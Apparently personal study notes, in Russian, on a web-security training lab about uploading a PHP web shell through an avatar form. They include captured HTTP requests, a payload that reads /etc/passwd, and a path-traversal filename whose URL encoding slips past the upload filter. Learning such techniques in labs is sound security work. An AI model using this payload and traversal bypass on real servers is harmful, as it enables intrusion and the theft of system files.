Лаборатория содержит уязвимую функцию загрузки изображений. Сервер настроен на предотвращение выполнения файлов, предоставленных пользователем, но это ограничение можно обойти, воспользовавшись вторичной уязвимостью.

## Дано

учётка `wiener:peter`

## Задача

загрузите базовую веб-оболочку PHP и использовать её для извлечения содержимого файла. `/home/carlos/secret`

# Разведка

POST запрос на смену аватарки
```
POST /my-account/avatar HTTP/2
Host: 0a810029034830ce80fe44a200c20063.web-security-academy.net
Cookie: session=yJvW2hVfRsTLIFcORHVgoUfvUw0sbmGD
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------323071807823304113702786884930
Content-Length: 499
Origin: https://0a810029034830ce80fe44a200c20063.web-security-academy.net
Referer: https://0a810029034830ce80fe44a200c20063.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
Connection: keep-alive

-----------------------------323071807823304113702786884930
Content-Disposition: form-data; name="avatar"; filename="icons8-google-chrome-200.png"
Content-Type: image/png


-----------------------------323071807823304113702786884930
Content-Disposition: form-data; name="user"

wiener
-----------------------------323071807823304113702786884930
Content-Disposition: form-data; name="csrf"

eFFjyVKLQdOuFdVV3fhwYI98wJC4vzxK
-----------------------------323071807823304113702786884930--

```

GET получение изображения
```
GET /files/avatars/icons8-google-chrome-200.png HTTP/2
Host: 0a810029034830ce80fe44a200c20063.web-security-academy.net
Cookie: session=yJvW2hVfRsTLIFcORHVgoUfvUw0sbmGD
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a810029034830ce80fe44a200c20063.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Priority: u=5, i
Te: trailers
```

#### 1. Попробуем добавить полезную нагрузку с php ответ 200 положительно пропускает но выдаёт ответ в формате текста
```
HTTP/2 200 OK
Date: Thu, 23 Jan 2025 10:57:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Thu, 23 Jan 2025 10:57:47 GMT
Etag: "2f-62c5d7b03ba76"
Accept-Ranges: bytes
X-Frame-Options: SAMEORIGIN
Content-Length: 47

<?php echo file_get_contents('/etc/passwd'); ?>
```

#### 2. Попробуем загрузить на путь до /files
```
-----------------------------323071807823304113702786884930
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
Content-Type: image/png

<?php echo file_get_contents('/etc/passwd'); ?>
```
Ответ 200 но он удаляет ../ . Попробуем закодировать в url
Супер `The file avatars/../exploit.php has been uploaded`

#### 3. Смотрим что находится теперь по новому пути с защитой

Пробита защита
![[Pasted image 20250123160627.png]]

